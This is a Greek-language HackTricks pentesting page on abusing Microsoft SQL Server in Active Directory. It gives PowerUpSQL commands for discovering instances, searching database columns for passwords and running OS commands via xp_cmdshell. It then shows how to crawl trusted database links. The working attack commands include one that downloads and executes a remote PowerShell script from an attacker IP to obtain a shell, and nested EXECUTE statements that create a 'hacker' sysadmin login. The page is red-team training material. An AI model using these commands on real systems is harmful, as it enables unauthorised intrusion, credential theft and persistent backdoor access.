# MSSQL AD Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL Enumeration / Discovery**

Το module powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτή την περίπτωση.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Αριθμητική από το δίκτυο χωρίς συνεδρία τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Αριθμητική από μέσα από το τομέα
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Βασική Κατάχρηση

### Πρόσβαση DB
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Μπορεί επίσης να είναι δυνατή η **εκτέλεση εντολών** μέσα στον MSSQL host
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Check in the page mentioned in the **following section how to do this manually.**

### MSSQL Basic Hacking Tricks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Trusted Links

Αν μια MSSQL εγκατάσταση είναι αξιόπιστη (σύνδεσμος βάσης δεδομένων) από μια διαφορετική MSSQL εγκατάσταση. Αν ο χρήστης έχει δικαιώματα πάνω στη αξιόπιστη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στην άλλη εγκατάσταση**. Αυτές οι εμπιστοσύνες μπορούν να αλυσωθούν και σε κάποιο σημείο ο χρήστης μπορεί να είναι σε θέση να βρει κάποια κακώς ρυθμισμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.

**Οι σύνδεσμοι μεταξύ των βάσεων δεδομένων λειτουργούν ακόμη και σε διασυνδέσεις δασών.**

### Powershell Abuse
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Μπορείτε να ελέγξετε εύκολα για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Παρατηρήστε ότι το metasploit θα προσπαθήσει να εκμεταλλευτεί μόνο τη λειτουργία `openquery()` στο MSSQL (έτσι, αν δεν μπορείτε να εκτελέσετε εντολή με `openquery()`, θα χρειαστεί να δοκιμάσετε τη μέθοδο `EXECUTE` **χειροκίνητα** για να εκτελέσετε εντολές, δείτε περισσότερα παρακάτω.)

### Χειροκίνητα - Openquery()

Από **Linux** μπορείτε να αποκτήσετε ένα MSSQL console shell με **sqsh** και **mssqlclient.py.**

Από **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **MSSQL client όπως** [**HeidiSQL**](https://www.heidisql.com)

_Συνδεθείτε χρησιμοποιώντας την αυθεντικοποίηση Windows:_

![](<../../.gitbook/assets/image (808).png>)

#### Βρείτε αξιόπιστους συνδέσμους
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (716).png>)

#### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο

Εκτέλεση ερωτημάτων μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στην νέα προσβάσιμη περίπτωση):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Ελέγξτε πού χρησιμοποιούνται τα διπλά και τα μονά εισαγωγικά, είναι σημαντικό να τα χρησιμοποιείτε με αυτόν τον τρόπο.
{% endhint %}

![](<../../.gitbook/assets/image (643).png>)

Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσμων για πάντα χειροκίνητα.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Αν δεν μπορείτε να εκτελέσετε ενέργειες όπως το `exec xp_cmdshell` από το `openquery()`, δοκιμάστε με τη μέθοδο `EXECUTE`.

### Χειροκίνητα - EXECUTE

Μπορείτε επίσης να εκμεταλλευτείτε τις αξιόπιστες συνδέσεις χρησιμοποιώντας το `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Τοπική Κλιμάκωση Δικαιωμάτων

Ο **τοπικός χρήστης MSSQL** συνήθως έχει έναν ειδικό τύπο δικαιώματος που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "παριστάνει έναν πελάτη μετά την αυθεντικοποίηση".

Μια στρατηγική που έχουν προτείνει πολλοί συγγραφείς είναι να αναγκάσουν μια υπηρεσία SYSTEM να αυθεντικοποιηθεί σε μια κακόβουλη ή υπηρεσία man-in-the-middle που δημιουργεί ο επιτιθέμενος. Αυτή η κακόβουλη υπηρεσία μπορεί στη συνέχεια να παριστάνει την υπηρεσία SYSTEM ενώ προσπαθεί να αυθεντικοποιηθεί.

[SweetPotato](https://github.com/CCob/SweetPotato) έχει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελούνται μέσω της εντολής `execute-assembly` του Beacon.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
